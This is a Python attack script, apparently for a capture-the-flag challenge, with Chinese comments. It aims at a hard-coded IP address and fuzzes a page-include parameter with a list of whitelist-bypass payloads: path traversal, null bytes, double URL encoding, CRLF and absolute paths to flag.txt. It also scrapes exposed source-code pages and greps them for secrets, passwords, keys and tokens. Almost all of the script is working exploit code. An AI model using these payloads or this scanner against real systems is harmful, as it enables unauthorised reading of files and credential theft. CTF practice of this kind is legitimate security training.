import requests
import re
import os
import html

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("获取Include源码")
print("="*70)

r = session.get(f"{TARGET}/include-source", timeout=15)
if r.status_code == 200:
    print(f"状态码: {r.status_code}")
    
    # 提取源码
    source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
    if source_match:
        source = html.unescape(source_match.group(1))
        print(f"Include源码:\n{source}")
        
        # 分析白名单
        whitelist = re.findall(r'ALLOWED_PAGES\s*=\s*\{([^}]+)\}', source)
        if whitelist:
            print(f"\n白名单配置: {whitelist}")
        
        # 分析验证逻辑
        validation_logic = re.findall(r'if.*?page.*?:', source)
        print(f"\n验证逻辑: {validation_logic}")
        
        # 搜索flag
        flag_match = re.search(r'flag\{[^}]+\}', source, re.IGNORECASE)
        if flag_match:
            print(f"\n🚩🚩🚩 FLAG FOUND IN INCLUDE SOURCE: {flag_match.group(0)} 🚩🚩🚩")
            exit(0)
else:
    print(f"/include-source 不存在，状态码: {r.status_code}")

print("\n" + "="*70)
print("测试Include绕过")
print("="*70)

# 根据可能的验证逻辑构造绕过payload
include_payloads = [
    # 基本白名单测试
    ("welcome", "基本welcome"),
    ("rules", "基本rules"),
    
    # 尝试路径遍历绕过白名单检查
    ("welcome/../flag.txt", "welcome+路径遍历"),
    ("welcome..flag.txt", "welcome+双点"),
    ("welcome%00flag.txt", "welcome+空字节"),
    ("welcome%5cflag.txt", "welcome+编码反斜杠"),
    ("welcome/flag.txt", "welcome+正斜杠"),
    ("welcome\\flag.txt", "welcome+反斜杠"),
    
    # 尝试大小写绕过
    ("Welcome", "大小写Welcome"),
    ("WELCOME", "全大写"),
    ("wElCoMe", "混合大小写"),
    ("RULES", "全大写Rules"),
    
    # 尝试URL编码绕过
    ("welcome%2e%2e%2fflag.txt", "编码点斜杠"),
    ("%77%65%6c%63%6f%6d%65", "编码welcome"),
    
    # 尝试添加空格或特殊字符
    ("welcome ", "welcome+空格"),
    ("welcome\t", "welcome+制表符"),
    ("welcome\n", "welcome+换行"),
    ("welcome%0a", "URL编码换行"),
    ("welcome%0d%0a", "CR+LF"),
    
    # 尝试使用welcome拼接其他字符串
    ("welcometest", "welcometest"),
    ("testwelcome", "testwelcome"),
    ("welcome.test", "welcome.test"),
    ("welcome_test", "welcome_test"),
    ("welcome-test", "welcome-test"),
    
    # 尝试使用引号
    ('"welcome"', "双引号welcome"),
    ("'welcome'", "单引号welcome"),
    
    # 尝试使用数组或对象
    ("welcome[0]", "数组welcome"),
    ("welcome.flag", "对象welcome"),
    
    # 尝试特殊编码
    ("welcome\x00flag.txt", "空字节字符"),
    ("welcome\xffflag.txt", "特殊字节"),
    
    # 尝试双重编码
    ("welcome%252fflag.txt", "双重编码斜杠"),
    ("welcome%255cflag.txt", "双重编码反斜杠"),
    
    # 尝试UTF-8编码绕过
    ("welcomë", "UTF-8变体"),
    
    # 尝试Unicode编码
    ("\\u0077elcome", "Unicode welcome"),
    
    # 尝试使用不同的页面名格式
    ("welcome.html", "welcome.html"),
    ("welcome.php", "welcome.php"),
    ("welcome.py", "welcome.py"),
    ("welcome.txt", "welcome.txt"),
    
    # 尝试使用绝对路径（如果在白名单检查后拼接）
    ("/flag.txt", "绝对路径flag"),
    ("F:\\flag.txt", "Windows路径"),
    
    # 尝试使用相对路径
    ("./flag.txt", "相对路径"),
    ("../flag.txt", "向上遍历"),
    ("../../flag.txt", "双重向上"),
]

for payload, desc in include_payloads:
    try:
        r = session.get(f"{TARGET}/include", params={"page": payload}, timeout=15)
        
        if r.status_code == 200:
            # 检查响应内容
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                # 分析响应
                if "Blocked" in content:
                    print(f"[BLOCKED] {desc}: {payload}")
                elif len(content) > 50:
                    # 检查是否有异常内容
                    if "welcome" not in content.lower() and "规则" not in content.lower():
                        print(f"\n>>> {desc}: {payload}")
                        print(f"响应: {content[:300]}")
                        
                        # 搜索flag
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
    except:
        pass

print("\n" + "="*70)
print("检查所有源码页面")
print("="*70)

source_pages = [
    "/include-source",
    "/ping-source",
    "/backup-source",
    "/search-source",
    "/login-source",
    "/message-source",
    "/dashboard-source",
    "/upload-source",
    "/full-source",
    "/app-source",
    "/server-source",
    "/main-source",
    "/config-source",
    "/all-source",
]

for page in source_pages:
    try:
        r = session.get(f"{TARGET}{page}", timeout=15)
        if r.status_code == 200 and len(r.text) > 1000:
            print(f"\n>>> {page}")
            print(f"状态码: {r.status_code}")
            
            # 提取源码
            source_match = re.search(r'<pre class="source-code">(.*?)</pre>', r.text, re.DOTALL)
            if source_match:
                source = html.unescape(source_match.group(1))
                print(f"源码长度: {len(source)}")
                
                # 搜索flag
                flag_match = re.search(r'flag\{[^}]+\}', source, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND IN {page}: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
                
                # 搜索敏感信息
                secret_vars = re.findall(r'(SECRET|FLAG|PASSWORD|KEY|TOKEN)\s*=\s*["\']([^"\']+)["\']', source, re.IGNORECASE)
                if secret_vars:
                    print(f"敏感变量: {secret_vars}")
                
                # 显示源码的一部分
                print(f"源码开头: {source[:300]}")
    except:
        pass

print("\n测试完成")